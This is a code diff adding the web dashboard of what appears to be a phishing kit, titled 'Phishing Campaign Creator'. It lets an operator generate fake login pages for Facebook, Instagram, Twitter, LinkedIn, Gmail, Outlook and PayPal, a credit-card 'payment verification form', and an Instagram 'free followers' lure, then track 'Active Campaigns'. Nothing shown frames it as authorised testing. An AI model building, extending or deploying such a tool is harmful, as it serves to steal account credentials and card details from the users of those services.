@@ -1,0 +1,494 @@
+{% extends "main/base.html" %}
+{% block content %}
+<div class="container py-4">
+    <!-- Hero Section with Particle Effect -->
+    <div class="text-center mb-5 position-relative hero-section">
+        <div id="particles-js"></div>
+        <h1 class="display-4 fw-bold text-gradient mb-3">
+            <i class="fas fa-fishing-rod me-2"></i>
+            Phishing Campaign Creator
+        </h1>
+        <p class="lead text-muted">Select a Platform to Launch Your Operation</p>
+    </div>
+
+    <!-- Navigation Tabs -->
+    <div class="tabs-container">
+        <ul class="nav nav-tabs" role="tablist">
+            <li class="nav-item">
+                <a class="nav-link active" data-bs-toggle="tab" href="#social">
+                    <i class="fas fa-share-alt me-2"></i>Social Media
+                </a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" data-bs-toggle="tab" href="#email">
+                    <i class="fas fa-envelope me-2"></i>Email Services
+                </a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" data-bs-toggle="tab" href="#business">
+                    <i class="fas fa-briefcase me-2"></i>Business
+                </a>
+            </li>
+            <li class="nav-item ms-auto">
+                <a class="nav-link" href="{{ url_for('campaigns') }}">
+                    <i class="fas fa-broadcast-tower me-2"></i>Active Campaigns
+                </a>
+            </li>
+        </ul>
+    </div>
+
+    <!-- Tab Content -->
+    <div class="tab-content mt-4">
+        <!-- Social Media Tab -->
+        <div class="tab-pane fade show active" id="social">
+            <div class="row g-4">
+                <!-- Facebook -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon">
+                            <i class="fab fa-facebook"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Facebook</h3>
+                            <p>Standard login page</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="facebook">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Instagram -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon instagram">
+                            <i class="fab fa-instagram"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Instagram</h3>
+                            <p>Standard login page</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="instagram">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Instagram Followers -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon instagram">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Instagram Followers</h3>
+                            <p>Free followers offer</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="instagram_followers">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Twitter -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon twitter">
+                            <i class="fab fa-twitter"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Twitter</h3>
+                            <p>Standard login page</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="twitter">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LinkedIn -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon linkedin">
+                            <i class="fab fa-linkedin"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>LinkedIn</h3>
+                            <p>Professional network login</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="linkedin">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Email Services Tab -->
+        <div class="tab-pane fade" id="email">
+            <div class="row g-4">
+                <!-- Gmail -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon google">
+                            <i class="fab fa-google"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Gmail</h3>
+                            <p>Google account login</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="gmail">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Outlook -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon microsoft">
+                            <i class="fab fa-microsoft"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Outlook</h3>
+                            <p>Microsoft account login</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="outlook">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Business Tab -->
+        <div class="tab-pane fade" id="business">
+            <div class="row g-4">
+                <!-- PayPal -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon paypal">
+                            <i class="fab fa-paypal"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>PayPal</h3>
+                            <p>Payment service login</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="paypal">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Credit Card -->
+                <div class="col-md-4 col-lg-3">
+                    <div class="campaign-card">
+                        <div class="campaign-icon credit-card">
+                            <i class="fas fa-credit-card"></i>
+                        </div>
+                        <div class="campaign-content">
+                            <h3>Credit Card</h3>
+                            <p>Payment verification form</p>
+                            <button class="btn btn-gradient w-100 create-page" data-type="credit_card">
+                                <i class="fas fa-plus me-2"></i>Create Campaign
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+/* Gradient Text Effect */
+.text-gradient {
+    background: linear-gradient(45deg, #6e48aa, #9d50bb, #6e48aa);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradient 8s ease infinite;
+    background-size: 200% auto;
+}
+
+@keyframes gradient {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+/* Hero Section */
+.hero-section {
+    padding: 3rem 0;
+    position: relative;
+    overflow: hidden;
+}
+
+#particles-js {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: 1;
+}
+
+.hero-section h1, .hero-section p {
+    position: relative;
+    z-index: 2;
+}
+
+/* Navigation Tabs */
+.tabs-container {
+    background: rgba(255, 255, 255, 0.05);
+    padding: 1rem;
+    border-radius: 15px;
+    backdrop-filter: blur(10px);
+}
+
+.nav-tabs {
+    border: none;
+    gap: 0.5rem;
+}
+
+.nav-tabs .nav-link {
+    color: var(--bs-gray-400);
+    border: none;
+    padding: 0.75rem 1.5rem;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.nav-tabs .nav-link:hover {
+    color: white;
+    background: rgba(255, 255, 255, 0.1);
+}
+
+.nav-tabs .nav-link.active {
+    color: white;
+    background: linear-gradient(45deg, #6e48aa, #9d50bb);
+}
+
+/* Campaign Cards */
+.campaign-card {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 15px;
+    padding: 1.5rem;
+    height: 100%;
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.campaign-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+}
+
+.campaign-icon {
+    width: 60px;
+    height: 60px;
+    background: linear-gradient(45deg, #6e48aa, #9d50bb);
+    border-radius: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 1rem;
+}
+
+.campaign-icon i {
+    font-size: 1.5rem;
+    color: white;
+}
+
+.campaign-icon.instagram {
+    background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
+}
+
+.campaign-icon.twitter {
+    background: linear-gradient(45deg, #1DA1F2, #19608F);
+}
+
+.campaign-icon.linkedin {
+    background: linear-gradient(45deg, #0077B5, #00A0DC);
+}
+
+.campaign-icon.google {
+    background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335);
+}
+
+.campaign-icon.microsoft {
+    background: linear-gradient(45deg, #00A4EF, #7FBA00, #F25022, #FFB900);
+}
+
+.campaign-icon.paypal {
+    background: linear-gradient(45deg, #003087, #009cde);
+}
+
+.campaign-icon.credit-card {
+    background: linear-gradient(45deg, #2c3e50, #3498db);
+}
+
+.campaign-content {
+    text-align: center;
+}
+
+.campaign-content h3 {
+    font-size: 1.25rem;
+    margin-bottom: 0.5rem;
+    color: white;
+}
+
+.campaign-content p {
+    color: var(--bs-gray-400);
+    font-size: 0.9rem;
+    margin-bottom: 1rem;
+}
+
+/* Button Styles */
+.btn-gradient {
+    background: linear-gradient(45deg, #6e48aa, #9d50bb);
+    border: none;
+    color: white;
+    padding: 0.75rem 1.5rem;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.btn-gradient:hover {
+    transform: translateY(-2px);
+    color: white;
+    box-shadow: 0 5px 15px rgba(110, 72, 170, 0.4);
+}
+
+/* Toast Notification */
+.toast-notification {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border-radius: 10px;
+    padding: 1rem;
+    color: white;
+    z-index: 1000;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    transform: translateY(100px);
+    opacity: 0;
+    transition: all 0.3s ease;
+}
+
+.toast-notification.show {
+    transform: translateY(0);
+    opacity: 1;
+}
+
+.toast-notification i {
+    color: #6e48aa;
+}
+</style>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialize particles.js
+    particlesJS('particles-js', {
+        particles: {
+            number: { value: 80, density: { enable: true, value_area: 800 } },
+            color: { value: '#6e48aa' },
+            shape: { type: 'circle' },
+            opacity: {
+                value: 0.5,
+                random: false,
+                animation: { enable: true, speed: 1, minimumValue: 0.1, sync: false }
+            },
+            size: {
+                value: 3,
+                random: true,
+                animation: { enable: true, speed: 2, minimumValue: 0.1, sync: false }
+            },
+            line_linked: {
+                enable: true,
+                distance: 150,
+                color: '#6e48aa',
+                opacity: 0.4,
+                width: 1
+            },
+            move: {
+                enable: true,
+                speed: 1,
+                direction: 'none',
+                random: false,
+                straight: false,
+                outMode: 'out',
+                bounce: false,
+            }
+        },
+        interactivity: {
+            detectsOn: 'canvas',
+            events: {
+                onHover: { enable: true, mode: 'grab' },
+                onClick: { enable: true, mode: 'push' },
+                resize: true
+            },
+            modes: {
+                grab: { distance: 140, lineLinked: { opacity: 1 } },
+                push: { particles_nb: 4 }
+            }
+        },
+        retina_detect: true
+    });
+
+    // Setup campaign creation
+    document.querySelectorAll('.create-page').forEach(button => {
+        button.addEventListener('click', function() {
+            const pageType = this.dataset.type;
+            createPage(pageType);
+        });
+    });
+});
+
+function createPage(pageType) {
+    const formData = new FormData();
+    formData.append('page_type', pageType);
+    
+    fetch('/create_page', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            showToast('Campaign created successfully!', 'check-circle');
+            setTimeout(() => {
+                window.location.href = '/campaigns';
+            }, 1000);
+        } else {
+            showToast('Error creating campaign!', 'exclamation-circle');
+        }
+    })
+    .catch(error => {
+        showToast('Error creating campaign!', 'exclamation-circle');
+    });
+}
+
+function showToast(message, icon) {
+    const toast = document.createElement('div');
+    toast.className = 'toast-notification';
+    toast.innerHTML = `
+        <i class="fas fa-${icon}"></i>
+        <span>${message}</span>
+    `;
+    
+    document.body.appendChild(toast);
+    setTimeout(() => toast.classList.add('show'), 100);
+    
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+</script>
+{% endblock %} 
